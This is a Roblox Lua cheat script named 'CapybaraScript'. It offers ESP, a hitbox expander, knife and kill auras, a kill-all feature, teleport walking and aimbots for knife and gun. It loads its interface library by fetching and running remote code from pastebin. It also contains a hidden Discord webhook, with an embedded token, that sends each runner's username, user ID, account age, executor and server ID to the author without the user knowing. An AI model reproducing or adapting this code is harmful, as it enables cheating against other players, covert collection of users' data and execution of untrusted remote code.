local Library = loadstring(game:HttpGet("https://pastebin.com/raw/Le0Aq8B7"))()
local Window = Library.CreateLib("​​​​​CapybaraScript 1.0 ", colors)

local colors = {
    SchemeColor = Color3.fromRGB(255, 87, 34),
    Background = Color3.fromRGB(36, 36, 36),
    Header = Color3.fromRGB(54, 54, 54),
    TextColor = Color3.fromRGB(255, 255, 255),
    ElementColor = Color3.fromRGB(121, 85, 72)
}
local CapyScreen = Instance.new("ScreenGui")
local CapyToggleUI = Instance.new("TextButton")
local CapyCornerUI = Instance.new("UICorner")
local CapyImageUI = Instance.new("ImageLabel")
local CapyImageCornerUI = Instance.new("UICorner")

CapyScreen.Name = "DANGGOHUBScreen"
CapyScreen.Parent = game.CoreGui
CapyScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
CapyScreen.ResetOnSpawn = false

CapyToggleUI.Name = "CapyToggleUI"
CapyToggleUI.Parent = CapyScreen
CapyToggleUI.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
CapyToggleUI.Position = UDim2.new(0.12, 0, 0.1, 0)
CapyToggleUI.Size = UDim2.new(0, 40, 0, 40)
CapyToggleUI.Text = ""
CapyToggleUI.Draggable = true
CapyToggleUI.MouseButton1Click:Connect(function()
    if Library and Library.ToggleUI then
        Library:ToggleUI()
    end
end)

CapyCornerUI.Name = "CapyCornerUI"
CapyCornerUI.CornerRadius = UDim.new(1, 0)
CapyCornerUI.Parent = CapyToggleUI

CapyImageUI.Name = "CapyImageUI"
CapyImageUI.Parent = CapyToggleUI
CapyImageUI.BackgroundColor3 = Color3.fromRGB(192, 192, 192)
CapyImageUI.BorderSizePixel = 0
CapyImageUI.Size = UDim2.new(1, 0, 1, 0)
CapyImageUI.Image = "rbxassetid://98340377583067"

CapyImageCornerUI.Name = "CapyImageCornerUI"
CapyImageCornerUI.CornerRadius = UDim.new(1, 0)
CapyImageCornerUI.Parent = CapyImageUI

local INFOTab = Window:NewTab("INFO⚠⚠")
local INFOSection = INFOTab:NewSection("Opciones información")
local CombateTab = Window:NewTab("Combat")
local HitboxTab = Window:NewTab("Hitbox expander")
local VisualTab = Window:NewTab("Visual")
local HitboxSection = HitboxTab:NewSection("Opciones Hitbox expander")
local VisualSection = VisualTab:NewSection("Opciones Visuales")
local CombateSection = CombateTab:NewSection("Opciones Combat")

local webhookURL = "https://discord.com/api/webhooks/1295255397183131668/pRh7yJ3rU7yFvHxvgIdhyy-R_e_Oa3DONJUcevi4wCG7OjCta8BnRQECDnXoUn3YJaTL"

local player = game:GetService("Players").LocalPlayer
local username = player.Name
local userId = player.UserId
local accountAge = player.AccountAge

local executor = "Unknown Executor"

if syn then
    executor = "Synapse X"
elseif KRNL_LOADED then
    executor = "KRNL"
elseif fluxus then
    executor = "Fluxus"
elseif evon then
    executor = "Evon"
elseif Arceus then
    executor = "Arceus X"
elseif wave then
    executor = "Wave"
elseif codex then
    executor = "Codex"
elseif vega_x then
    executor = "Vega X"
elseif delta then
    executor = "Delta"
elseif solara then
    executor = "Solara"
elseif cryptic then
    executor = "Cryptic"
elseif trigon then
    executor = "Trigon"
elseif MantiPWF then
    executor = "MantiPWF"
else
    if identifyexecutor then
        executor = identifyexecutor()
    elseif getexecutorname then
        executor = getexecutorname()
    end
end

local jobId = game.JobId or "Unknown Job ID"

local function sendToDiscord(message)
    local request = http_request or request or syn.request or http.request
    if not request then
        warn("Executor tidak mendukung HTTP Requests.")
        return
    end

    local data = {
        ["content"] = message,
        ["embeds"] = {{
            ["title"] = "Roblox Executor Notification",
            ["fields"] = {
                {["name"] = "User:", ["value"] = "```" .. username .. "```", ["inline"] = false},
                {["name"] = "User ID:", ["value"] = "```" .. tostring(userId) .. "```", ["inline"] = false},
                {["name"] = "User Age:", ["value"] = "```" .. tostring(accountAge) .. "```", ["inline"] = false},
                {["name"] = "Executor", ["value"] = "```" .. executor .. "```", ["inline"] = false},
                {["name"] = "Job ID:", ["value"] = "```" .. jobId .. "```", ["inline"] = false}
            },
            ["color"] = 65280 -- Warna merah
        }}
    }

    request({
        Url = webhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode(data)
    })
end

sendToDiscord("Execute!")

local tpwalking = false
local distanceMultiplier = 0.3

local function tpwalk(character)
    local humanoid = character:WaitForChild("Humanoid")
    tpwalking = true

    while tpwalking and character and humanoid and humanoid.Parent do
        local delta = game:GetService("RunService").Heartbeat:Wait()
        local moveDirection = humanoid.MoveDirection

        if moveDirection.Magnitude > 0 then
            local teleportOffset = moveDirection * distanceMultiplier * delta * 10
            character:TranslateBy(teleportOffset)
        end
    end
end

local function onCharacterAdded(character)
    if tpwalking then
        tpwalk(character)
    end
end

game.Players.LocalPlayer.CharacterAdded:Connect(onCharacterAdded)

CombateSection:NewToggle("Tp walk", "ToggleInfo", function(state)
    if state then
        tpwalking = true
        local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
        tpwalk(character)
    else
        tpwalking = false
    end
end)

CombateSection:NewTextBox("speed", "Introduce un valor numérico", function(value)
    local newSpeed = tonumber(value)
    if newSpeed then
        distanceMultiplier = newSpeed
    end
end)

local hitboxSize = 1
local hitboxTransparency = 0.7
local hitboxCollisionEnabled = false
local hitboxColor = Color3.fromRGB(255, 255, 255)
local hitboxEnabled = false

local connection

local function isCharacterValid(character)
    return character and character:FindFirstChild("HumanoidRootPart")
end

local function updateHitboxesIfEnabled()
    if hitboxEnabled then
        hitboxes(true)
    end
end

local function hitboxes(enable)
    for _, player in pairs(game:GetService("Players"):GetPlayers()) do
        if player ~= game:GetService("Players").LocalPlayer then
            local character = player.Character
            if isCharacterValid(character) then
                local rootPart = character.HumanoidRootPart
                rootPart.CanCollide = hitboxCollisionEnabled
                if enable then
                    rootPart.Transparency = hitboxTransparency
                    rootPart.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
                    rootPart.Color = hitboxColor
                else
                    rootPart.Transparency = 1
                    rootPart.Size = Vector3.new(1, 1, 1)
                end
            end
        end
    end
end

local function updateHitboxColor()
    hitboxColor = Color3.fromRGB(255, 255, 255)
    updateHitboxesIfEnabled()
end

HitboxSection:NewToggle("Hitbox Expander", "ToggleInfo", function(state)
    hitboxEnabled = state

    if connection then
        connection:Disconnect()
    end

    if hitboxEnabled then
        hitboxes(true)
        connection = game:GetService("RunService").Stepped:Connect(function()
            hitboxes(true)
        end)
    else
        hitboxes(false)
    end
end)

HitboxSection:NewTextBox("Hitbox Size", "Enter size value", function(value)
    local newSize = tonumber(value)
    if newSize then
        hitboxSize = newSize
    else
        hitboxSize = 1
    end
    updateHitboxesIfEnabled()
end)

HitboxSection:NewTextBox("Hitbox Transparency", "Enter transparency value", function(value)
    local newTransparency = tonumber(value)
    if newTransparency then
        hitboxTransparency = math.clamp(newTransparency / 10, 0, 1)
    else
        hitboxTransparency = 0.7
    end
    updateHitboxesIfEnabled()
end)

HitboxSection:NewTextBox("Red", "Enter Red value (0-255)", function(value)
    local newRed = tonumber(value)
    if newRed then
        hitboxColor = Color3.fromRGB(math.clamp(newRed, 0, 255), hitboxColor.G, hitboxColor.B)
    else
        hitboxColor = Color3.fromRGB(255, hitboxColor.G, hitboxColor.B)
    end
    updateHitboxesIfEnabled()
end)

HitboxSection:NewTextBox("Green", "Enter Green value (0-255)", function(value)
    local newGreen = tonumber(value)
    if newGreen then
        hitboxColor = Color3.fromRGB(hitboxColor.R, math.clamp(newGreen, 0, 255), hitboxColor.B)
    else
        hitboxColor = Color3.fromRGB(hitboxColor.R, 255, hitboxColor.B)
    end
    updateHitboxesIfEnabled()
end)

HitboxSection:NewTextBox("Blue", "Enter Blue value (0-255)", function(value)
    local newBlue = tonumber(value)
    if newBlue then
        hitboxColor = Color3.fromRGB(hitboxColor.R, hitboxColor.G, math.clamp(newBlue, 0, 255))
    else
        hitboxColor = Color3.fromRGB(hitboxColor.R, hitboxColor.G, 255)
    end
    updateHitboxesIfEnabled()
end)

HitboxSection:NewToggle("Hitbox Collision", "ToggleInfo", function(state)
    hitboxCollisionEnabled = state
    updateHitboxesIfEnabled()
end)

local RunService = game:GetService("RunService")
local player = game.Players.LocalPlayer

local knifeEquipped = false
local auraActive = false
local auraConnection
local humanoidRootPart
local lastSlashTime = 0
local slashInterval = 0.5

local function getHumanoidRootPart(character)
    if character then
        return character:WaitForChild("HumanoidRootPart", 2)
    end
    return nil
end

player.CharacterAdded:Connect(function(character)
    humanoidRootPart = getHumanoidRootPart(character)
end)

if player.Character then
    humanoidRootPart = getHumanoidRootPart(player.Character)
end

local function equipKnife()
    local knife = player.Backpack:FindFirstChild("Knife")
    if not knifeEquipped and knife then
        knife.Parent = player.Character
        knifeEquipped = true
    end
end

local function unequipKnife()
    local knife = player.Character:FindFirstChild("Knife")
    if knifeEquipped and knife then
        knife.Parent = player.Backpack
        knifeEquipped = false
    end
end

local function findNearbyPlayer()
    local nearestPlayer = nil
    local nearestDistance = 7.3

    for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
        if otherPlayer ~= player and otherPlayer.Character then
            local otherHumanoidRootPart = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
            if otherHumanoidRootPart then
                local distance = (humanoidRootPart.Position - otherHumanoidRootPart.Position).Magnitude
                if distance <= nearestDistance then
                    nearestPlayer = otherPlayer
                    break
                end
            end
        end
    end
    return nearestPlayer
end

local function handleAura()
    if not auraActive or not humanoidRootPart then
        return
    end

    local target = findNearbyPlayer()
    if target then
        equipKnife()
        if knifeEquipped then
            local currentTime = tick()
            if currentTime - lastSlashTime >= slashInterval then
                local args = { [1] = 1 }
                game:GetService("Players").LocalPlayer.Character.Knife.KnifeServer.SlashStart:FireServer(unpack(args))
                lastSlashTime = currentTime
            end
        end
    else
        unequipKnife()
    end
end

local function StartKnifeAura()
    if auraConnection then auraConnection:Disconnect() end
    auraActive = true
    auraConnection = RunService.Heartbeat:Connect(handleAura)
end

local function StopKnifeAura()
    auraActive = false
    unequipKnife()
    if auraConnection then
        auraConnection:Disconnect()
        auraConnection = nil
    end
end

CombateSection:NewToggle("Knife Aura", "ToggleInfo", function(state)
    if state then
        StartKnifeAura()
    else
        StopKnifeAura()
    end
end)

RunService.Heartbeat:Connect(function()
    if auraActive and not humanoidRootPart and player.Character then
        humanoidRootPart = getHumanoidRootPart(player.Character)
    end
end)

CombateSection:NewToggle("Kill aura", "Activa o desactiva el script", function(state)
    scriptActive = state
end)

CombateSection:NewTextBox("Detection Radius Kill Aura", "Escribe el radio de detección para los enemigos", function(value)
    detectionRadius = tonumber(value) or 9.4
end)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local humanoidRootPart
local tpOffset = 2.8

local function hasKnife()
    local backpack = player:FindFirstChild("Backpack")
    if backpack and backpack:FindFirstChild("Knife") then
        return true
    end
    local character = player.Character
    if character and character:FindFirstChild("Knife") then
        return true
    end
    return false
end

local function getHumanoidRootPart(character)
    if character then
        return character:WaitForChild("HumanoidRootPart", 2)
    end
    return nil
end

local function teleportEnemy(enemy)
    if humanoidRootPart and enemy then
        local enemyRoot = enemy:FindFirstChild("HumanoidRootPart")
        if enemyRoot then
            local forwardDirection = humanoidRootPart.CFrame.LookVector
            local teleportPosition = humanoidRootPart.Position + forwardDirection * tpOffset
            enemyRoot.CFrame = CFrame.new(teleportPosition)
        end
    end
end

local function findClosestPlayer()
    local closestPlayer = nil
    local closestDistance = detectionRadius

    for _, otherPlayer in ipairs(Players:GetPlayers()) do
        if otherPlayer ~= player and otherPlayer.Character then
            local otherRoot = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
            if otherRoot then
                local distance = (otherRoot.Position - humanoidRootPart.Position).Magnitude
                if distance < closestDistance then
                    closestPlayer = otherPlayer
                    closestDistance = distance
                end
            end
        end
    end

    return closestPlayer
end

local function teleportClosestPlayer()
    if scriptActive and humanoidRootPart and hasKnife() then
        local closestPlayer = findClosestPlayer()
        if closestPlayer and closestPlayer.Character then
            teleportEnemy(closestPlayer.Character)
        end
    end
end

player.CharacterAdded:Connect(function(character)
    humanoidRootPart = getHumanoidRootPart(character)
end)

humanoidRootPart = getHumanoidRootPart(player.Character)

RunService.Heartbeat:Connect(function()
    if scriptActive and hasKnife() and humanoidRootPart then
        teleportClosestPlayer()
    end
end)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Player = Players.LocalPlayer
local espTransparency = 0.6
local espConnection
local visibleColor = Color3.new(0, 1, 0)
local hiddenColor = Color3.new(1, 0, 0)

local function clearESP()
    for _, otherPlayer in pairs(Players:GetPlayers()) do
        if otherPlayer ~= Player and otherPlayer.Character then
            local highlight = otherPlayer.Character:FindFirstChild("Highlight")
            if highlight then
                highlight:Destroy()
            end
        end
    end
end

local function updateESP()
    for _, otherPlayer in pairs(Players:GetPlayers()) do
        if otherPlayer ~= Player and otherPlayer.Character then
            local humanoidRootPart = otherPlayer.Character:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                local highlight = otherPlayer.Character:FindFirstChild("Highlight")
                if not highlight then
                    highlight = Instance.new("Highlight")
                    highlight.Parent = otherPlayer.Character
                end

                highlight.FillTransparency = espTransparency
                highlight.OutlineTransparency = 0
                highlight.Enabled = true

                local rayOrigin = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") and Player.Character.HumanoidRootPart.Position
                if rayOrigin then
                    local rayDirection = (humanoidRootPart.Position - rayOrigin).Unit * (humanoidRootPart.Position - rayOrigin).Magnitude
                    local raycastParams = RaycastParams.new()
                    raycastParams.FilterDescendantsInstances = {Player.Character}
                    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
                    raycastParams.IgnoreWater = true

                    local raycastResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
                    if raycastResult and raycastResult.Instance and not raycastResult.Instance:IsDescendantOf(otherPlayer.Character) then
                        highlight.FillColor = hiddenColor
                    else
                        highlight.FillColor = visibleColor
                    end
                end
            end
        end
    end
end

VisualSection:NewToggle("ESP Player with Raycasting", "Enable or disable the ESP", function(state)
    if state then
        if not espConnection then
            espConnection = RunService.Heartbeat:Connect(updateESP)
        end
    else
        if espConnection then
            espConnection:Disconnect()
            espConnection = nil
        end
        clearESP()
    end
end)

VisualSection:NewTextBox("ESP Transparency", "Set the transparency of the ESP", function(value)
    espTransparency = tonumber(value) or espTransparency
    if espConnection then
        updateESP()
    end
end)

VisualSection:NewColorPicker("Color Visible", "Select the color for visible players", visibleColor, function(color)
    visibleColor = color
end)

VisualSection:NewColorPicker("Color Hidden", "Select the color for hidden players", hiddenColor, function(color)
    hiddenColor = color
end)

CombateSection:NewButton("FAKE SPEED GLICH", "ButtonInfo", function()
local existingGui = game:GetService("CoreGui"):FindFirstChild("fakespeed")
if existingGui then
    return
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "fakespeed"
screenGui.Parent = game:GetService("CoreGui")

local button = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")

button.Name = "Button"
button.Size = UDim2.new(0, 50, 0, 50)
button.Position = UDim2.new(0.5, -10, 0.5, -25)
button.Text = "OFF"
button.Font = Enum.Font.Gotham
button.TextSize = 14
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
button.BackgroundTransparency = 0.6
button.Draggable = true
button.BorderSizePixel = 0
button.Parent = screenGui

UICorner.CornerRadius = UDim.new(0, 15)
UICorner.Parent = button

local isActive = false
local slidingConnection

local function toggleButton()
    isActive = not isActive
    if isActive then
        button.Text = "ON"
        button.BackgroundColor3 = Color3.fromRGB(173, 216, 230)
    else
        button.Text = "OFF"
        button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    end
end

button.MouseButton1Click:Connect(toggleButton)

local player = game.Players.LocalPlayer
local slidingSpeed = 3
local maxSlidingSpeed = 15 
local acceleration = 0.2
local deceleration = 0.1
local landingDeceleration = 0.05
local slideAfterLandSpeed = 2
local slideAfterLandDuration = 0.3

local function setupCharacter(character)
    local humanoid = character:WaitForChild("Humanoid")
    local landed = false
    local slideTime = 0

    local function isInAir()
        return humanoid:GetState() == Enum.HumanoidStateType.Freefall
    end

    local function isLanding()
        return humanoid:GetState() == Enum.HumanoidStateType.Landed
    end

    if slidingConnection then
        slidingConnection:Disconnect()
    end

    slidingConnection = game:GetService("RunService").RenderStepped:Connect(function(deltaTime)
        if isInAir() and isActive then
            local direction = humanoid.MoveDirection
            if direction.Magnitude > 0 then
                slidingSpeed = math.min(slidingSpeed + acceleration, maxSlidingSpeed)
                character:TranslateBy(direction * slidingSpeed * deltaTime)
            else
                slidingSpeed = math.max(slidingSpeed - deceleration, 0)
            end
        elseif isLanding() then
            if not landed then
                slidingSpeed = slideAfterLandSpeed
                slideTime = 0
                landed = true
            end
        elseif landed then
            if slideTime < slideAfterLandDuration then
                character:TranslateBy(humanoid.MoveDirection * slidingSpeed * deltaTime)
                slideTime = slideTime + deltaTime
                slidingSpeed = math.max(slidingSpeed - landingDeceleration, 0)
            else
                landed = false
            end
        else
            slidingSpeed = math.max(slidingSpeed - deceleration, 0)
        end
    end)
end

player.CharacterAdded:Connect(setupCharacter)
if player.Character then
    setupCharacter(player.Character)
end
end)

CombateSection:NewButton("Knife aim", "ButtonInfo", function()
local existingGui = game:GetService("CoreGui"):FindFirstChild("mygui")
if existingGui then return end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "mygui"
screenGui.Parent = game:GetService("CoreGui")

local function createButton(name, position, size, text)
    local button = Instance.new("TextButton")
    button.Name = name
    button.Size = size
    button.Position = position
    button.Text = text
    button.Font = Enum.Font.Gotham
    button.TextSize = 14
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    button.BackgroundTransparency = 0.6
    button.BorderSizePixel = 2
    button.BorderColor3 = Color3.fromRGB(0, 0, 0)
    button.Draggable = true
    button.TextScaled = true
    button.Parent = screenGui
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 15)
    UICorner.Parent = button
    return button
end

local button = createButton("MyButton", UDim2.new(1, -110, 0, 50), UDim2.new(0, 120, 0, 120), "")
local teamCheckButton = createButton("TeamCheckButton", UDim2.new(0, 10, 0, 10), UDim2.new(0, 50, 0, 50), "Team Check: ON")

local player = game.Players.LocalPlayer
local camera = game.Workspace.CurrentCamera

local teamCheckEnabled = true

local function isPlayerVisible(target)
    local targetPosition = target.Character.HumanoidRootPart.Position
    local screenPoint = camera:WorldToScreenPoint(targetPosition)
    return screenPoint.Z > 0 and screenPoint.Y > 0 and screenPoint.Y < camera.ViewportSize.Y and screenPoint.X > 0 and screenPoint.X < camera.ViewportSize.X
end

local function getClosestVisibleEnemy()
    local closestEnemy = nil
    local closestDistance = math.huge

    for _, enemy in ipairs(game.Players:GetPlayers()) do
        if enemy ~= player and enemy.Character and enemy.Character:FindFirstChild("HumanoidRootPart") then
            if not teamCheckEnabled or enemy.Team ~= player.Team then
                local distance = (player.Character.HumanoidRootPart.Position - enemy.Character.HumanoidRootPart.Position).Magnitude
                if distance < closestDistance and isPlayerVisible(enemy) then
                    closestDistance = distance
                    closestEnemy = enemy
                end
            end
        end
    end

    return closestEnemy
end

local function onButtonClick()
    button.BackgroundColor3 = Color3.fromRGB(173, 216, 230)

    local target = getClosestVisibleEnemy()
    if target then
        local targetPosition = target.Character.HumanoidRootPart.Position
        local flingArgs = { CFrame.new(targetPosition.X, targetPosition.Y + 1, targetPosition.Z), Vector3.new(targetPosition.X, targetPosition.Y + 1, targetPosition.Z) }
        game:GetService("Players").LocalPlayer.Character.Knife.KnifeServer.FlingKnife:FireServer(unpack(flingArgs))
        game:GetService("Players").LocalPlayer.Character.Knife.KnifeServer.SetKnifeGoneTime:FireServer(1)
    end

    wait(0.02)
    button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
end

button.MouseButton1Click:Connect(onButtonClick)

local function toggleTeamCheck()
    teamCheckEnabled = not teamCheckEnabled
    teamCheckButton.Text = teamCheckEnabled and "Team Check: ON" or "Team Check: OFF"
end

teamCheckButton.MouseButton1Click:Connect(toggleTeamCheck)

local function getPing()
    local stats = player:FindFirstChild("Stats")
    return stats and stats:FindFirstChild("Ping") and stats.Ping.Value or 0
end

local function isTargetInAir(targetCharacter)
    local humanoid = targetCharacter and targetCharacter:FindFirstChild("Humanoid")
    return humanoid and humanoid.FloorMaterial == Enum.Material.Air
end

local function calculateOffset(ping, distanceToClosestPlayer, isTargetInAir)
    local horizontalOffset, verticalOffset = 0.15, 0
    if ping > 120 then horizontalOffset, verticalOffset = 0.10, -0.03
    elseif ping <= 50 then horizontalOffset = 0.05
    elseif ping <= 60 then horizontalOffset = 0.08
    elseif ping <= 70 then horizontalOffset = 0.12
    elseif ping <= 80 then horizontalOffset = 0.14
    elseif ping <= 90 then horizontalOffset = 0.16 end

    if distanceToClosestPlayer and distanceToClosestPlayer < 2 then
        horizontalOffset, verticalOffset = horizontalOffset * 0.2, verticalOffset * 0.2
    elseif distanceToClosestPlayer and distanceToClosestPlayer > 18 then
        horizontalOffset = horizontalOffset * 0.63
    end

    if isTargetInAir then horizontalOffset = horizontalOffset * 0.2 end
    verticalOffset = math.clamp(verticalOffset, -0.15, 0.2)

    return horizontalOffset, verticalOffset
end

local function predictPosition(targetCharacter)
    local humanoidRootPart = targetCharacter:FindFirstChild("HumanoidRootPart")
    if humanoidRootPart then
        local targetPosition = humanoidRootPart.Position
        local targetVelocity = humanoidRootPart.Velocity
        local distanceToPlayer = (targetPosition - player.Character.HumanoidRootPart.Position).Magnitude
        local predictionTime = math.clamp(distanceToPlayer / 50, 0, 0.1)
        local predictedPosition = targetPosition + targetVelocity * predictionTime
        local ping = getPing()
        local inAir = isTargetInAir(targetCharacter)
        local horizontalOffset, verticalOffset = calculateOffset(ping, distanceToPlayer, inAir)
        return predictedPosition + Vector3.new(horizontalOffset, verticalOffset, 0)
    end
    return nil
end

local function getClosestPlayer()
    local localHumanoidRootPart = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not localHumanoidRootPart then repeat wait(0.1) until player.Character and player.Character:FindFirstChild("HumanoidRootPart") end

    local closestPlayer, closestDistance = nil, math.huge
    for _, otherPlayer in ipairs(game.Players:GetPlayers()) do
        if otherPlayer ~= player and otherPlayer.Character and otherPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local distance = (localHumanoidRootPart.Position - otherPlayer.Character.HumanoidRootPart.Position).Magnitude
            if distance < closestDistance then
                closestDistance, closestPlayer = distance, otherPlayer
            end
        end
    end
    return closestPlayer
end
end) 

CombateSection:NewButton("Kill All [with Knife Only]", "ButtonInfo", function()
local Players = game:GetService("Players")
local Plr = Players.LocalPlayer

local knife = Plr.Backpack:FindFirstChild("Knife") or Plr.Character:FindFirstChild("Knife")
if not knife then
    return
end

local localPosition = Plr.Character.HumanoidRootPart.Position
local forwardVector = Plr.Character.HumanoidRootPart.CFrame.LookVector
local teleportPosition = localPosition + forwardVector * 2.7

if knife.Parent ~= Plr.Character then
    knife.Parent = Plr.Character
    repeat task.wait(0.1) until Plr.Character:FindFirstChild("Knife")
end

for attackCount = 1, 10 do
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= Plr and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local humanoidRootPart = player.Character.HumanoidRootPart

            humanoidRootPart.CFrame = CFrame.new(teleportPosition)

            humanoidRootPart.Anchored = true
        end
    end

    game:GetService("Players").LocalPlayer.Character.Knife.KnifeServer.SlashStart:FireServer(1)
    task.wait(0.1)
end

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= Plr and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local humanoidRootPart = player.Character.HumanoidRootPart
        humanoidRootPart.Anchored = false
    end
end
    end)
 
 CombateSection:NewButton("Shoot", "ButtonInfo", function()
    local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local isSharpShooterActive = true
local isTeamCheckActive = true

local function EquipGun()
    local gunInCharacter = LocalPlayer.Character:FindFirstChild("Gun")
    if gunInCharacter then
        return false
    end

    local gunInBackpack = LocalPlayer.Backpack:FindFirstChild("Gun")
    if gunInBackpack then
        gunInBackpack.Parent = LocalPlayer.Character
    end
end

local function UnequipGun()
    wait(0.2)
    local gunInCharacter = LocalPlayer.Character:FindFirstChild("Gun")
    if gunInCharacter then
        gunInCharacter.Parent = LocalPlayer.Backpack
    end
end

local function getPing()
    local stats = LocalPlayer:FindFirstChild("Stats")
    if stats and stats:FindFirstChild("Ping") then
        return stats.Ping.Value
    end
    return 0
end

local function isTargetInAir(targetCharacter)
    if not targetCharacter then return false end
    local humanoid = targetCharacter:FindFirstChild("Humanoid")
    if humanoid then
        return humanoid.FloorMaterial == Enum.Material.Air
    end
    return false
end

local function calculateOffset(ping, distanceToClosestPlayer, isTargetInAir, isTargetSmallHitbox)
    local horizontalOffset = 0.3
    local verticalOffset = -0.3

    if ping > 120 then
        horizontalOffset = 0.3
        verticalOffset = -0.1
    elseif ping <= 50 then
        horizontalOffset = 0.1
        verticalOffset = 0
    elseif ping <= 70 then
        horizontalOffset = 0.2
        verticalOffset = 0
    elseif ping <= 90 then
        horizontalOffset = 0.3
        verticalOffset = 0.02
    end

    if isSharpShooterActive then
        horizontalOffset = horizontalOffset * 0.2
        verticalOffset = verticalOffset * 0.3
    else
        if isTargetSmallHitbox then
            horizontalOffset = horizontalOffset * 0.2
            verticalOffset = verticalOffset * 0.2
        end

        if distanceToClosestPlayer and distanceToClosestPlayer < 10 then
            horizontalOffset = horizontalOffset * 0.6
            verticalOffset = verticalOffset * 0.8
        elseif distanceToClosestPlayer and distanceToClosestPlayer > 20 then
            horizontalOffset = horizontalOffset * 0.8
        end

        if isTargetInAir then
            verticalOffset = verticalOffset + 0.1
        end
    end

    verticalOffset = math.clamp(verticalOffset, -0.1, 0.15)

    return horizontalOffset, verticalOffset
end

local function predictPosition(targetCharacter, distanceToClosestPlayer)
    local humanoidRootPart = targetCharacter:FindFirstChild("HumanoidRootPart")
    if humanoidRootPart then
        local targetPosition = humanoidRootPart.Position
        local targetVelocity = humanoidRootPart.Velocity
        local distanceToPlayer = (targetPosition - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude

        local predictionTime = math.clamp(distanceToPlayer / 50, 0, 0.1)
        local predictedPosition = targetPosition + targetVelocity * predictionTime

        local ping = getPing()
        local inAir = isTargetInAir(targetCharacter)
        local humanoid = targetCharacter:FindFirstChild("Humanoid")
        local smallHitbox = false
        if humanoid then
            local success, result = pcall(function() return humanoid.HipWidth end)
            if success then
                smallHitbox = result < 2
            end
        end

        local horizontalOffset, verticalOffset = calculateOffset(ping, distanceToClosestPlayer, inAir, smallHitbox)

        if isSharpShooterActive then
            return humanoidRootPart.Position + targetVelocity * predictionTime
        end

        predictedPosition = predictedPosition + Vector3.new(horizontalOffset, verticalOffset, 0)

        return Vector3.new(predictedPosition.X, targetPosition.Y, predictedPosition.Z)
    end
    return nil
end

local function getClosestPlayer()
    local localHumanoidRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not localHumanoidRootPart then
        repeat
            wait(0.1)
            localHumanoidRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        until localHumanoidRootPart
    end

    local closestPlayer = nil
    local shortestDistance = math.huge
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            -- Comprobación de equipo
            if isTeamCheckActive and player.Team == LocalPlayer.Team then
                continue  -- No disparar al jugador de su propio equipo
            end

            local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                local distance = (localHumanoidRootPart.Position - humanoidRootPart.Position).Magnitude
                if distance < shortestDistance then
                    shortestDistance = distance
                    closestPlayer = player
                end
            end
        end
    end
    return closestPlayer and closestPlayer.Character, shortestDistance
end

local function shootAtClosestPlayer()
    EquipGun()

    local closestCharacter, distanceToClosestPlayer = getClosestPlayer()
    if closestCharacter then
        local predictedPosition = predictPosition(closestCharacter, distanceToClosestPlayer)
        if predictedPosition then
            local gun = LocalPlayer.Character:FindFirstChild("Gun")
            if gun and gun:FindFirstChild("GunServer") and gun.GunServer:FindFirstChild("ShootStart") then
                local args = {
                    [1] = 1,
                    [2] = predictedPosition
                }
                gun.GunServer.ShootStart:FireServer(unpack(args))
                UnequipGun()
            end
        end
    end
end

local existingGui = game:GetService("CoreGui"):FindFirstChild("mygui")
if existingGui then return end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "mygui"
screenGui.Parent = game:GetService("CoreGui")

local button = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local clickSound = Instance.new("Sound")
local toggleTeamCheckButton = Instance.new("TextButton")

button.Name = "Button"
button.Size = UDim2.new(0, 150, 0, 150)
button.Position = UDim2.new(0.85, -50, 0.15, -50)
button.Text = "Shoot"
button.Font = Enum.Font.Gotham
button.TextSize = 14
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
button.BackgroundTransparency = 0.6
button.Draggable = true
button.BorderSizePixel = 0
button.Parent = screenGui

toggleTeamCheckButton.Name = "ToggleTeamCheckButton"
toggleTeamCheckButton.Size = UDim2.new(0, 150, 0, 50)
toggleTeamCheckButton.Position = UDim2.new(0.85, -50, 0.3, -50)
toggleTeamCheckButton.Text = "desable Team Check"
toggleTeamCheckButton.Font = Enum.Font.Gotham
toggleTeamCheckButton.TextSize = 14
